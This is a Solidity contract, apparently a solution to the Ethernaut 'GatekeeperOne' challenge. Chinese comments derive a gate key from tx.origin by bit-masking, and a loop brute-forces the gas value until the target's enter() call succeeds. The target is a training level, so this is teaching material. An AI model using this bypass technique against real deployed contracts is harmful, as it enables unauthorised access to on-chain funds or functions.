// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

contract GatekeeperOneRun { 
  function run(address _runAddress) external  {
    //gas = 254+8191; (用console.log打印出gas剩余,本地测算是254，不过线上可能有些许差异可能是有带优化参数,所以可以调小254进行循环测试)
    uint256 gas = 254+81910;
   
    /**
     *  
     *  1.require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
     *  2.require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
     *  3.require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three"); 
     *  gateKey三个条件都满足才能通过
     *  分析：
     *  首先要把address转成对应的uint160,gateKey是byte8对应uint64
     *  根据条件3：tx.origin的0-16跟gateKey的0-16是一样
     *  根据条件1：16-32位要全是0 （不然截取后不会相等）
     *  根据条件2：32-64位不全是0  (不然截取后会相等)
     *  所以uint64(uint16(uint160(tx.origin))，把address转成160后截取成16再转成64位后，自动满足条件1和3，但不满足条件2，故再加上0x1_00_00_00_00即可（把33设为1）
     *       
     */
    bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))+0x100000000)); 
    while (true) {
      (bool result,) = _runAddress.call{gas:gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
      if (result) {
        break;
      }      
      gas++;
    }
  } 
}